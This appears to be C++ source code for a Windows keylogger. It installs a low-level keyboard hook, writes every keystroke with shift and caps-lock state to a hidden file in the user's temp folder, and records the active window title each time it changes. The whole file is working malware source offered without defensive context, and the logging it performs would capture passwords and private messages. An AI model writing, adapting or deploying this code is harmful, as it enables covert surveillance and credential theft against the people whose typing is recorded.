#include <iostream>
#include <fstream>
#include "Keylogger_header.h"

using namespace std;
BOOL shift = FALSE;
BOOL caps = FALSE;
char* location;
char last_name[MY_MAX_PATH];
char file_name[] = "\\k.temp";

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	ofstream myfile;
	myfile.open(location, ios::app);
	char name[MY_MAX_PATH];
	HWND hWindow = GetForegroundWindow();
	int txtlen = GetWindowTextLength(hWindow);
	int err = GetWindowTextA(hWindow, name, txtlen);
	if (strncmp(name, last_name, MY_MAX_PATH) != 0) {
		strncpy_s(last_name, name, MY_MAX_PATH);
		myfile << "\n<Title> " << last_name << " </Title>\n";
	}

	// If key is being pressed
	if (wParam == WM_KEYDOWN) {

		switch (p->vkCode) {
			// Invisible keys
		case VK_CAPITAL:
			if (!caps) {
				myfile << "<CAPLOCK>";
				caps = TRUE;
			}
			else {
				myfile << "</CAPLOCK>";
				caps = FALSE;
			}break;
		case VK_SHIFT:		myfile << "<SHIFT>";	shift = TRUE;	break;
		case 160:			myfile << "<SHIFT>";	shift = TRUE;	break;
		case VK_LCONTROL:	myfile << "<LCTRL>";	break;
		case VK_RCONTROL:	myfile << "<RCTRL>";	break;
		case VK_INSERT:		myfile << "<INSERT>";	break;
		case VK_END:		myfile << "<END>";		break;
		case VK_PRINT:		myfile << "<PRINT>";	break;
		case VK_DELETE:		myfile << "<DEL>";		break;
		case VK_BACK:		myfile << "<BK>";		break;
		case VK_LEFT:		myfile << "<LEFT>";		break;
		case VK_RIGHT:		myfile << "<RIGHT>";	break;
		case VK_UP:			myfile << "<UP>";		break;
		case VK_DOWN:		myfile << "<DOWN>";		break;
		case VK_RETURN:		myfile << "<Enter>\n";	break;
		case VK_TAB:		myfile << "<Tab>\n";	break;
			// Visible keys
		default:
			if (!shift && !caps) myfile << char(tolower(p->vkCode));
			else if (!shift && caps)  myfile << char(toupper(p->vkCode));
			else {
				int vk = p->vkCode;
				switch (vk) {
				case '1': myfile << '!';  break;
				case '2': myfile << '@';  break;
				case '3': myfile << '#';  break;
				case '4': myfile << '$';  break;
				case '5': myfile << '%';  break;
				case '6': myfile << '^';  break;
				case '7': myfile << '&';  break;
				case '8': myfile << '*';  break;
				case '9': myfile << '(';  break;
				case '0': myfile << ')';  break;
				case 0xba: myfile << ':';  break;
				case 0xbb: myfile << '+';  break;
				case 0xbc: myfile << '<';  break;
				case 0xbd: myfile << '_';  break;
				case 0xbe: myfile << '>';  break;
				case 0xbf: myfile << '?';  break;
				case 0xc0: myfile << '~';  break;
				case 0xdb: myfile << '{';  break;
				case 0xdc: myfile << '|';  break;
				case 0xdd: myfile << '}';  break;
				case 0xde: myfile << '\"'; break;

				default:
					if (!caps)	myfile << char(toupper(p->vkCode));
					else		myfile << char(tolower(p->vkCode));
				}
			}
		}
	}if (wParam == WM_KEYUP) {
		switch (p->vkCode) {
		case VK_SHIFT:		myfile << "</SHIFT>";	shift = FALSE; break;
		case 160:			myfile << "</SHIFT>";	shift = FALSE; break;

		default:			break;
		}
	}
	myfile.close();
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI Keylogger_main(LPVOID lpParameter) {
	if (lpParameter == NULL) {
		char var_name[] = "temp";
		char location_var[MAX_PATH];
		GetEnvironmentVariableA(var_name, location_var, MAX_PATH);
		strcat_s(location_var, file_name);
		location = location_var;
	}
	else
		location = (char*)lpParameter;

	HINSTANCE app = GetModuleHandle(NULL);
	SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app, 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return NULL;
}

